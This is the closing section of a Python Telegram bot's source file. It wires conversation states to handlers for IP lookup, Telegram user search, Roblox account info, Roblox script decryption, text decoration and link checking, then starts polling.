            GETTING_IP_INFO_QUERY: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_ip_info)],
            GETTING_TELEGRAM_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, search_telegram_user)],
            GETTING_ROBLOX_USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_roblox_account_info)],
            GETTING_DECORATE_TEXT: [MessageHandler(filters.TEXT & ~filters.COMMAND, decorate_text)],
            GETTING_DECRYPT_ROBLOX_SCRIPT: [MessageHandler(filters.Document.ALL, decrypt_roblox_script)],
            GETTING_CHECK_LINK_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, check_link)],
        },
        fallbacks=[CommandHandler("cancel", cancel), CallbackQueryHandler(main_menu, pattern='^main_menu$')],
        per_message=False  # <-- هذا يزيل التحذير
    )

    application.add_handler(conv_handler)
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
